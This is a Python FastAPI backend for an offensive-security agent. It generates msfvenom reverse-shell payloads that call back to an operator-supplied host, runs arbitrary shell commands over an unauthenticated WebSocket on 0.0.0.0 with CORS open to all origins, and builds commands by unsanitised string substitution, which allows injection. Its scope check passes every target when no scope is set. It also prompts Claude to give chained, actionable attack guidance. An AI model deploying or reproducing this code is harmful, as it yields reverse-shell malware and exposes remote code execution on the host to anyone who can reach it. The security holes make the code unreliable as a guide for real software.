"""
Offensive Security MCP Agent — FastAPI Backend
Daemons Zyrax — Ans Inayat

Provides:
  - REST API for tool management, payload gen, scope control
  - WebSocket endpoint for real-time command execution streaming
  - Claude AI integration for intelligent tool suggestions & analysis
  - Audit logging for all executions
  - MCP config generation
"""

import asyncio
import json
import os
import subprocess
import signal
import shlex
import logging
import hashlib
import re
from datetime import datetime
from pathlib import Path
from typing import Optional, AsyncGenerator

import anthropic
import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

# ── Paths & Logging ───────────────────────────────────────────────────────────
BASE_DIR = Path(__file__).parent
LOG_DIR   = BASE_DIR / "logs"
REPORTS   = BASE_DIR / "reports"
PAYLOADS  = BASE_DIR / "payloads"
STATIC    = BASE_DIR / "static"
for d in [LOG_DIR, REPORTS, PAYLOADS, STATIC]:
    d.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [API] %(levelname)s %(message)s",
    handlers=[
        logging.FileHandler(LOG_DIR / f"api_{datetime.now().strftime('%Y%m%d')}.log"),
        logging.StreamHandler(),
    ]
)
log = logging.getLogger("api")

# ── Import tool registry ───────────────────────────────────────────────────────
import sys
sys.path.insert(0, str(BASE_DIR / "mcp_server"))
from tools_registry import TOOLS_REGISTRY, TOOLS_BY_NAME, TOOLS_BY_CATEGORY, OffensiveTool

# ── FastAPI App ────────────────────────────────────────────────────────────────
app = FastAPI(
    title="Offensive Security MCP Agent",
    description="Daemons Zyrax — Ans Inayat",
    version="2.0.0",
)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# Serve static files (frontend)
app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")

# ── State ──────────────────────────────────────────────────────────────────────
SCOPE: list[str] = []
ENGAGEMENT_NAME: str = "default"
ACTIVE_PROCS: dict[str, asyncio.subprocess.Process] = {}
AI_HISTORY: list[dict] = []
EXECUTION_LOG: list[dict] = []

# ── Pydantic Models ────────────────────────────────────────────────────────────

class ScopeModel(BaseModel):
    targets: list[str]
    engagement_name: str = "default"

class ToolExecModel(BaseModel):
    tool_name: str
    args: dict = {}

class PayloadModel(BaseModel):
    payload_type: str = "exe"
    lhost: str
    lport: int = 4444
    encoder: Optional[str] = None
    iterations: int = 1
    output_name: Optional[str] = None

class AIQueryModel(BaseModel):
    message: str
    system_context: Optional[str] = None

class CommandModel(BaseModel):
    command: str
    timeout: int = 120

class MCPConfigModel(BaseModel):
    transport: str = "stdio"  # stdio | sse
    server_host: str = "localhost"
    server_port: int = 8080

# ── Helpers ────────────────────────────────────────────────────────────────────

def in_scope(target: str) -> bool:
    if not SCOPE:
        return True
    import ipaddress
    for s in SCOPE:
        if s.lower() in target.lower():
            return True
        try:
            net  = ipaddress.ip_network(s, strict=False)
            addr = ipaddress.ip_address(target.split(":")[0])
            if addr in net:
                return True
        except ValueError:
            pass
    return False

def audit_log(action: str, tool: str, command: str, result: str, risk: str = "medium"):
    entry = {
        "timestamp": datetime.now().isoformat(),
        "action": action,
        "tool": tool,
        "command": command,
        "result_summary": result[:200],
        "risk_level": risk,
    }
    EXECUTION_LOG.append(entry)
    log_file = LOG_DIR / f"audit_{datetime.now().strftime('%Y%m%d')}.jsonl"
    with open(log_file, "a") as f:
        f.write(json.dumps(entry) + "\n")

def build_command(tool: OffensiveTool, args: dict) -> str:
    cmd = tool.command_template
    for k, v in args.items():
        cmd = cmd.replace(f"{{{k}}}", str(v))
    for k, default in tool.args_schema.get("optional", {}).items():
        if f"{{{k}}}" in cmd:
            cmd = cmd.replace(f"{{{k}}}", str(default))
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_path = str(REPORTS / f"{tool.name}_{ts}.txt")
    cmd = cmd.replace("{output}", output_path)
    return cmd

async def stream_command(cmd: str, ws: WebSocket, timeout: int = 300) -> int:
    """Stream command output to WebSocket in real-time."""
    await ws.send_json({"type": "exec_start", "command": cmd, "ts": datetime.now().isoformat()})
    proc = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        env={**os.environ, "TERM": "xterm-256color"},
        preexec_fn=os.setsid if hasattr(os, 'setsid') else None,
    )
    pid = str(proc.pid)
    ACTIVE_PROCS[pid] = proc
    await ws.send_json({"type": "exec_pid", "pid": pid})

    async def read_stream(stream, stream_type: str):
        while True:
            line = await stream.readline()
            if not line:
                break
            await ws.send_json({
                "type": stream_type,
                "data": line.decode("utf-8", errors="replace"),
                "ts": datetime.now().isoformat(),
            })

    try:
        await asyncio.wait_for(
            asyncio.gather(
                read_stream(proc.stdout, "stdout"),
                read_stream(proc.stderr, "stderr"),
            ),
            timeout=timeout
        )
    except asyncio.TimeoutError:
        await ws.send_json({"type": "stderr", "data": f"\n[!] Command timed out after {timeout}s\n"})
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            proc.kill()

    await proc.wait()
    ACTIVE_PROCS.pop(pid, None)
    await ws.send_json({"type": "exec_end", "returncode": proc.returncode, "pid": pid})
    return proc.returncode

# ── REST Endpoints ─────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def root():
    index = STATIC / "index.html"
    if index.exists():
        return HTMLResponse(index.read_text())
    return HTMLResponse("<h1>Offensive MCP Agent API</h1><p>Frontend not built yet.</p>")

@app.get("/api/health")
async def health():
    return {"status": "online", "version": "2.0.0", "engagement": ENGAGEMENT_NAME, "scope_targets": len(SCOPE)}

@app.get("/api/tools")
async def get_tools(category: Optional[str] = None, platform: Optional[str] = None, search: Optional[str] = None):
    tools = TOOLS_REGISTRY
    if category:
        tools = [t for t in tools if t.category == category]
    if platform:
        tools = [t for t in tools if t.platform in (platform, "both")]
    if search:
        q = search.lower()
        tools = [t for t in tools if q in t.name.lower() or q in t.description.lower() or any(q in tag for tag in t.tags)]
    return {
        "total": len(tools),
        "tools": [
            {
                "name": t.name, "category": t.category, "platform": t.platform,
                "description": t.description, "command_template": t.command_template,
                "tags": t.tags, "risk_level": t.risk_level,
                "args_required": t.args_schema.get("required", []),
                "args_optional": t.args_schema.get("optional", {}),
            }
            for t in tools
        ]
    }

@app.get("/api/tools/categories")
async def get_categories():
    return {cat: len(tools) for cat, tools in TOOLS_BY_CATEGORY.items()}

@app.get("/api/tools/{tool_name}")
async def get_tool(tool_name: str):
    tool = TOOLS_BY_NAME.get(tool_name)
    if not tool:
        raise HTTPException(404, f"Tool not found: {tool_name}")
    return {
        "name": tool.name, "category": tool.category, "platform": tool.platform,
        "description": tool.description, "command_template": tool.command_template,
        "tags": tool.tags, "risk_level": tool.risk_level,
        "args_required": tool.args_schema.get("required", []),
        "args_optional": tool.args_schema.get("optional", {}),
    }

@app.post("/api/scope")
async def set_scope(scope: ScopeModel):
    global SCOPE, ENGAGEMENT_NAME
    SCOPE = scope.targets
    ENGAGEMENT_NAME = scope.engagement_name
    log.info(f"Scope updated: {SCOPE} engagement={ENGAGEMENT_NAME}")
    return {"status": "ok", "targets": SCOPE, "engagement": ENGAGEMENT_NAME}

@app.get("/api/scope")
async def get_scope():
    return {"targets": SCOPE, "engagement": ENGAGEMENT_NAME}

@app.post("/api/tools/build-command")
async def build_tool_command(req: ToolExecModel):
    """Build and preview command without executing."""
    tool = TOOLS_BY_NAME.get(req.tool_name)
    if not tool:
        raise HTTPException(404, f"Tool not found: {req.tool_name}")
    cmd = build_command(tool, req.args)
    return {
        "tool": tool.name,
        "command": cmd,
        "risk_level": tool.risk_level,
        "platform": tool.platform,
    }

@app.post("/api/payload/generate")
async def generate_payload(req: PayloadModel):
    """Generate reverse shell payload via msfvenom."""
    payload_map = {
        "exe":  ("windows/x64/meterpreter/reverse_tcp", "exe"),
        "elf":  ("linux/x64/meterpreter/reverse_tcp",   "elf"),
        "php":  ("php/meterpreter/reverse_tcp",          "raw"),
        "ps1":  ("cmd/windows/reverse_powershell",       "raw"),
        "aspx": ("windows/x64/meterpreter/reverse_tcp",  "aspx"),
        "apk":  ("android/meterpreter/reverse_tcp",      "raw"),
        "jar":  ("java/meterpreter/reverse_tcp",         "jar"),
    }
    if req.payload_type not in payload_map:
        raise HTTPException(400, f"Unsupported payload type: {req.payload_type}")

    payload, fmt = payload_map[req.payload_type]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_name = req.output_name or f"payload_{ts}.{req.payload_type}"
    out_path = PAYLOADS / out_name

    cmd_parts = [
        "msfvenom", "-p", payload,
        f"LHOST={req.lhost}", f"LPORT={req.lport}",
        "-f", fmt,
    ]
    if req.encoder:
        cmd_parts += ["-e", req.encoder, "-i", str(req.iterations)]
    cmd_parts += ["-o", str(out_path)]

    cmd = " ".join(cmd_parts)
    log.info(f"Generating payload: {cmd}")

    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        audit_log("payload_generate", "msfvenom", cmd, f"exit={proc.returncode}", "critical")
        return {
            "status": "ok" if proc.returncode == 0 else "error",
            "payload": payload,
            "format": fmt,
            "output_file": str(out_path),
            "lhost": req.lhost,
            "lport": req.lport,
            "stdout": stdout.decode(errors="replace"),
            "stderr": stderr.decode(errors="replace"),
        }
    except asyncio.TimeoutError:
        raise HTTPException(504, "msfvenom timed out")

@app.get("/api/reports")
async def list_reports():
    files = sorted(REPORTS.glob("*.txt"), key=lambda f: f.stat().st_mtime, reverse=True)
    return [{"name": f.name, "size": f.stat().st_size, "modified": datetime.fromtimestamp(f.stat().st_mtime).isoformat()} for f in files]

@app.get("/api/reports/{filename}")
async def get_report(filename: str):
    path = REPORTS / filename
    if not path.exists() or not path.is_relative_to(REPORTS):
        raise HTTPException(404, "Report not found")
    return FileResponse(path, media_type="text/plain")

@app.get("/api/payloads")
async def list_payloads():
    files = sorted(PAYLOADS.glob("*"), key=lambda f: f.stat().st_mtime, reverse=True)
    return [{"name": f.name, "size": f.stat().st_size} for f in files if f.is_file()]

@app.get("/api/audit")
async def get_audit_log(limit: int = 50):
    return {"entries": EXECUTION_LOG[-limit:], "total": len(EXECUTION_LOG)}

@app.post("/api/sessions/kill/{pid}")
async def kill_session(pid: str):
    proc = ACTIVE_PROCS.get(pid)
    if not proc:
        raise HTTPException(404, "Process not found")
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        return {"status": "killed", "pid": pid}
    except Exception as e:
        raise HTTPException(500, str(e))

@app.get("/api/sessions")
async def list_sessions():
    return {"active_pids": list(ACTIVE_PROCS.keys()), "count": len(ACTIVE_PROCS)}

@app.post("/api/mcp/config")
async def generate_mcp_config(req: MCPConfigModel):
    """Generate MCP configuration JSON for Claude Desktop / Claude Code."""
    if req.transport == "stdio":
        config = {
            "mcpServers": {
                "offensive-kali": {
                    "command": "python3",
                    "args": [str(BASE_DIR / "mcp_server" / "mcp_server.py")],
                    "env": {"ENGAGEMENT": ENGAGEMENT_NAME},
                }
            }
        }
    else:
        config = {
            "mcpServers": {
                "offensive-sse": {
                    "url": f"http://{req.server_host}:{req.server_port}/mcp",
                    "transport": "sse",
                }
            }
        }
    return {"config": config, "json": json.dumps(config, indent=2)}

# ── AI Endpoint ────────────────────────────────────────────────────────────────

@app.post("/api/ai/chat")
async def ai_chat(req: AIQueryModel):
    """Claude AI integration — context-aware offensive security assistant."""
    global AI_HISTORY

    api_key = os.getenv("ANTHROPIC_API_KEY", "")
    if not api_key:
        return JSONResponse({"error": "ANTHROPIC_API_KEY not set. Add it to your environment."}, status_code=503)

    client = anthropic.Anthropic(api_key=api_key)

    # Build tool context
    tool_summary = "\n".join(
        f"- {t.name} [{t.category}/{t.platform}]: {t.description}"
        for t in TOOLS_REGISTRY[:30]
    )

    system = f"""You are an expert offensive security AI assistant for Daemons Zyrax.
The operator is Ans Inayat, a professional penetration tester.

Current engagement: {ENGAGEMENT_NAME}
In-scope targets: {', '.join(SCOPE) if SCOPE else 'Not set yet — remind user to set scope'}

Available MCP tools (sample):
{tool_summary}
... and {len(TOOLS_REGISTRY)} total tools.

Guidelines:
- Provide precise, actionable attack guidance
- Reference specific tool names from the registry
- Chain tools logically: recon → scan → exploit → post
- Always mention scope and authorization requirements
- Format commands clearly with explanations
- Flag high-risk actions (CRITICAL/HIGH risk level tools)
- Suggest evidence collection and report-ready output paths

{req.system_context or ''}"""

    AI_HISTORY.append({"role": "user", "content": req.message})
    if len(AI_HISTORY) > 20:
        AI_HISTORY = AI_HISTORY[-20:]

    try:
        response = client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=2048,
            system=system,
            messages=AI_HISTORY,
        )
        reply = response.content[0].text
        AI_HISTORY.append({"role": "assistant", "content": reply})
        return {"reply": reply, "history_length": len(AI_HISTORY)}
    except anthropic.APIError as e:
        log.error(f"Claude API error: {e}")
        raise HTTPException(500, f"Claude API error: {e}")

@app.delete("/api/ai/history")
async def clear_ai_history():
    global AI_HISTORY
    AI_HISTORY = []
    return {"status": "cleared"}

# ── WebSocket — Real-time Command Execution ────────────────────────────────────

@app.websocket("/ws/terminal")
async def terminal_ws(ws: WebSocket):
    await ws.accept()
    log.info("Terminal WebSocket connected")
    await ws.send_json({"type": "connected", "message": "Offensive MCP Agent terminal ready", "ts": datetime.now().isoformat()})

    try:
        while True:
            data = await ws.receive_json()
            msg_type = data.get("type", "")

            if msg_type == "execute_tool":
                tool_name = data.get("tool_name", "")
                args      = data.get("args", {})
                tool = TOOLS_BY_NAME.get(tool_name)
                if not tool:
                    await ws.send_json({"type": "error", "data": f"Unknown tool: {tool_name}\n"})
                    continue

                # Scope check
                target_keys = ["target", "url", "domain", "dc"]
                for k in target_keys:
                    if k in args and not in_scope(args[k]):
                        await ws.send_json({
                            "type": "scope_violation",
                            "data": f"⛔ SCOPE VIOLATION: {args[k]} is not in scope!\nIn-scope: {', '.join(SCOPE)}\n"
                        })
                        break
                else:
                    cmd = build_command(tool, args)
                    audit_log("execute", tool.name, cmd, "initiated", tool.risk_level)
                    returncode = await stream_command(cmd, ws, timeout=600)
                    audit_log("execute_done", tool.name, cmd, f"rc={returncode}", tool.risk_level)

            elif msg_type == "execute_raw":
                cmd = data.get("command", "").strip()
                if not cmd:
                    continue
                timeout = data.get("timeout", 120)
                audit_log("raw_command", "terminal", cmd, "initiated", "medium")
                returncode = await stream_command(cmd, ws, timeout=timeout)
                audit_log("raw_done", "terminal", cmd, f"rc={returncode}", "medium")

            elif msg_type == "kill":
                pid = data.get("pid", "")
                proc = ACTIVE_PROCS.get(pid)
                if proc:
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                        await ws.send_json({"type": "killed", "pid": pid})
                    except Exception as e:
                        await ws.send_json({"type": "error", "data": str(e)})
                else:
                    await ws.send_json({"type": "error", "data": f"PID {pid} not found"})

            elif msg_type == "ping":
                await ws.send_json({"type": "pong", "ts": datetime.now().isoformat()})

    except WebSocketDisconnect:
        log.info("Terminal WebSocket disconnected")
    except Exception as e:
        log.error(f"WebSocket error: {e}", exc_info=True)

@app.websocket("/ws/ai")
async def ai_ws(ws: WebSocket):
    """Streaming AI chat over WebSocket."""
    await ws.accept()
    global AI_HISTORY

    api_key = os.getenv("ANTHROPIC_API_KEY", "")
    if not api_key:
        await ws.send_json({"type": "error", "data": "ANTHROPIC_API_KEY not set"})
        await ws.close()
        return

    client = anthropic.Anthropic(api_key=api_key)

    tool_summary = "\n".join(
        f"- {t.name} [{t.category}]: {t.description}"
        for t in TOOLS_REGISTRY
    )

    system = f"""You are an expert offensive security AI assistant for Daemons Zyrax.
Operator: Ans Inayat — professional penetration tester.
Engagement: {ENGAGEMENT_NAME}
Scope: {', '.join(SCOPE) if SCOPE else 'Not configured'}

Full tool registry ({len(TOOLS_REGISTRY)} tools):
{tool_summary}

Be precise, technical, and actionable. Chain tools logically. Always validate scope."""

    try:
        while True:
            data = await ws.receive_json()
            msg_type = data.get("type", "chat")

            if msg_type == "chat":
                user_msg = data.get("message", "")
                AI_HISTORY.append({"role": "user", "content": user_msg})
                if len(AI_HISTORY) > 30:
                    AI_HISTORY = AI_HISTORY[-30:]

                await ws.send_json({"type": "ai_start"})
                full_reply = ""
                try:
                    with client.messages.stream(
                        model="claude-sonnet-4-20250514",
                        max_tokens=2048,
                        system=system,
                        messages=AI_HISTORY,
                    ) as stream:
                        for text in stream.text_stream:
                            full_reply += text
                            await ws.send_json({"type": "ai_token", "data": text})

                    AI_HISTORY.append({"role": "assistant", "content": full_reply})
                    await ws.send_json({"type": "ai_done", "full": full_reply})
                except anthropic.APIError as e:
                    await ws.send_json({"type": "error", "data": str(e)})

            elif msg_type == "clear":
                AI_HISTORY = []
                await ws.send_json({"type": "history_cleared"})

            elif msg_type == "ping":
                await ws.send_json({"type": "pong"})

    except WebSocketDisconnect:
        log.info("AI WebSocket disconnected")

# ── Startup ────────────────────────────────────────────────────────────────────

@app.on_event("startup")
async def startup():
    log.info("=" * 60)
    log.info("Offensive Security MCP Agent API — Daemons Zyrax")
    log.info(f"Tools loaded: {len(TOOLS_REGISTRY)}")
    log.info(f"API docs: http://localhost:8000/docs")
    log.info("=" * 60)


if __name__ == "__main__":
    uvicorn.run("api_server:app", host="0.0.0.0", port=8000, reload=True, log_level="info")
